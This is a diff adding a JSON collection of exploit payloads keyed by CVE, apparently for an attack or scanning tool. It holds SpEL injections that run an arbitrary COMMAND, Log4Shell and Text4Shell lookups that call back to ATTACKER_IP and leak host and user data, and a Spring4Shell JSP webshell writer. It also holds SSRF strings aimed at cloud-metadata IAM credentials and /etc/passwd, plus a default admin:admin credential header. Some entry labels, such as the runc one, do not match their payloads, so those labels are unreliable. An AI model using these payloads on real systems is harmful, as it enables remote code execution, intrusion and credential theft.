@@ -1,0 +1,114 @@
+{
+  "_comment": "CVE payload database. COMMAND placeholder is replaced at runtime with the actual test command.",
+  "CVE-2025-55182": {
+    "_description": "SpEL Injection variants for Spring Framework — CVE-2025-55182",
+    "payloads": [
+      "{\"query\":\"{{#this.getClass().forName(\\\"java.lang.Runtime\\\").getMethod(\\\"getRuntime\\\").invoke(null).exec(\\\"COMMAND\\\")}}\"}",
+      "{\"query\":\"{{new java.lang.ProcessBuilder(\\\"COMMAND\\\").start()}}\"}",
+      "{\"query\":\"{{T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec(\\\"COMMAND\\\").getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream())}}\"}",
+      "{\"query\":\"{{#this.getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"java.lang.Runtime.getRuntime().exec(\\\\\\\"COMMAND\\\\\\\")\\\")}}\"}" ,
+      "{\"query\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"COMMAND\\\")}}\"}",
+      "{\"query\": \"%7B%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22COMMAND%22%29%7D%7D\"}",
+      "{\"qu\\u0065ry\": \"{{T(java.lang.Runtime).getRuntime().exec(\\\"COMMAND\\\")}}\"}",
+      "{\n\t\"query\":\n\t\"{{T(java.lang.Runtime).getRuntime().exec(\\\"COMMAND\\\")}}\"\n}"
+    ]
+  },
+  "CVE-2025-66478": {
+    "_description": "GraphQL-specific SpEL injections — CVE-2025-66478",
+    "payloads": [
+      "{\"query\":\"mutation { execute(cmd: \\\"{{T(java.lang.Runtime).getRuntime().exec(\\\\\\\"COMMAND\\\\\\\")}}\\\") { result } }\"}",
+      "{\"query\":\"query { system(cmd: \\\"{{new java.lang.ProcessBuilder(\\\"sh\\\",\\\"-c\\\",\\\"COMMAND\\\").start()}}\\\") }\"}",
+      "{\"query\":\"{__schema { types { name fields { name args { defaultValue @export(as: \\\"cmd\\\") } } } } }\",\"variables\":{\"cmd\":\"{{T(java.lang.Runtime).getRuntime().exec(\\\"COMMAND\\\")}}\"}}"
+    ]
+  },
+  "CVE-2021-44228": {
+    "_description": "Log4Shell — JNDI injection (Log4j 2.0-beta9 to 2.14.1). Replace ATTACKER_IP with listener address.",
+    "payloads": [
+      "${jndi:ldap://ATTACKER_IP:1389/COMMAND}",
+      "${jndi:rmi://ATTACKER_IP:1099/COMMAND}",
+      "${jndi:dns://ATTACKER_IP/COMMAND}",
+      "${jndi:ldap://${hostName}.ATTACKER_IP:1389/COMMAND}",
+      "${jndi:ldap://${env:USER}.ATTACKER_IP:1389/COMMAND}",
+      "${jndi:ldap://${sys:java.version}.ATTACKER_IP:1389/COMMAND}"
+    ]
+  },
+  "CVE-2022-22965": {
+    "_description": "Spring4Shell — ClassLoader data binding RCE (Spring Framework < 5.3.18 / < 5.2.20)",
+    "payloads": [
+      "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcat-war&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
+      "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{cmd}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
+    ]
+  },
+  "CVE-2022-42889": {
+    "_description": "Text4Shell — Apache Commons Text interpolation RCE (< 1.10.0). Replace ATTACKER_IP with listener address.",
+    "payloads": [
+      "${script:javascript:java.lang.Runtime.getRuntime().exec(\"COMMAND\")}",
+      "${url:UTF-8:http://ATTACKER_IP/COMMAND}",
+      "${dns:address:ATTACKER_IP}"
+    ]
+  },
+  "CVE-2023-46604": {
+    "_description": "Apache ActiveMQ RCE — OpenWire ClassInfo deserialization (CRITICAL, used by Lazarus/APT groups). Affects ActiveMQ < 5.15.16, < 5.16.7, < 5.17.6, < 5.18.3.",
+    "_endpoints": ["/admin/", "/admin/queues.jsp", "/api/jolokia/", "/hawtio/", "/console/"],
+    "payloads": [
+      "{\"type\": \"exec\", \"mbean\": \"org.apache.activemq:type=Broker,brokerName=localhost\", \"operation\": \"addConnector(java.lang.String)\", \"arguments\": [\"tcp://ATTACKER_IP:61617?wireFormat.maxInactivityDuration=0\"]}",
+      "{\"type\": \"exec\", \"mbean\": \"org.apache.activemq:type=Broker,brokerName=localhost\", \"operation\": \"removeConnector(java.lang.String)\", \"arguments\": [\"connector0\"]}",
+      "GET /admin/queues.jsp HTTP/1.1\r\nHost: TARGET\r\nAuthorization: Basic YWRtaW46YWRtaW4=",
+      "{\"class\": \"org.springframework.context.support.ClassPathXmlApplicationContext\", \"url\": \"http://ATTACKER_IP/poc.xml\"}"
+    ]
+  },
+  "CVE-2024-22243": {
+    "_description": "Spring Framework SSRF via UriComponentsBuilder. Affects Spring 5.x < 5.3.32, 6.0.x < 6.0.17, 6.1.x < 6.1.4.",
+    "_type": "ssrf",
+    "payloads": [
+      "url=http://169.254.169.254/latest/meta-data/",
+      "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "target=http://internal-service.local/api/secret",
+      "url=file:///etc/passwd",
+      "url=dict://127.0.0.1:6379/info",
+      "url=http://[::]:22",
+      "url=http://127.0.0.1:8080/actuator/env"
+    ]
+  },
+  "CVE-2024-38816": {
+    "_description": "Spring WebFlux static resource path traversal (Linux). Affects Spring Framework 5.3.x < 5.3.40, 6.0.x < 6.0.24, 6.1.x < 6.1.12.",
+    "_type": "path_traversal",
+    "payloads": [
+      "/static/../WEB-INF/web.xml",
+      "/resources/../WEB-INF/web.xml",
+      "/static/..%2F..%2FWEB-INF%2Fweb.xml",
+      "/static/%2e%2e%2f%2e%2e%2fWEB-INF/web.xml",
+      "/static/..;/..;/WEB-INF/web.xml",
+      "/resources/..%252F..%252FWEB-INF/web.xml",
+      "/static/..%5c..%5cWEB-INF/web.xml"
+    ]
+  },
+  "CVE-2024-4577": {
+    "_description": "PHP CGI argument injection on Windows/XAMPP. Affects PHP 8.0-8.3 on Windows with CGI handler.",
+    "_type": "argument_injection",
+    "payloads": [
+      "?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+      "?%ADd+allow_url_include%3d1&%ADd+auto_prepend_file%3dphp://input",
+      "/php-cgi/php.exe?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
+      "?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
+    ]
+  },
+  "CVE-2023-34104": {
+    "_description": "fast-xml-parser ReDoS / prototype pollution. Affects fast-xml-parser < 4.2.4.",
+    "_type": "redos",
+    "payloads": [
+      "<?xml version=\"1.0\"?><root><item>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!</item></root>",
+      "{\"xmlData\": \"<?xml version=\\\"1.0\\\"?><!DOCTYPE lolz [<!ENTITY lol \\\"lol\\\"><!ENTITY lol2 \\\"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\\\">]><lolz>&lol2;</lolz>\"}",
+      "<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">]><lolz>&lol2;</lolz>"
+    ]
+  },
+  "CVE-2024-21626": {
+    "_description": "runc container escape (LEAKY_VESSELS). Affects runc <= 1.1.11. Detection via /proc/self/fd exposure.",
+    "_type": "container_escape_detection",
+    "payloads": [
+      "{\"query\": \"{{T(java.lang.ProcessBuilder).command(\\\"ls\\\",\\\"/proc/self/fd\\\").start().waitFor()}}\"}",
+      "{\"query\": \"{{T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get(\\\"/proc/self/cgroup\\\"))}}\"}",
+      "{\"cmd\": \"cat /proc/self/cgroup | grep -E 'docker|containerd|lxc'\"}"
+    ]
+  }
+}
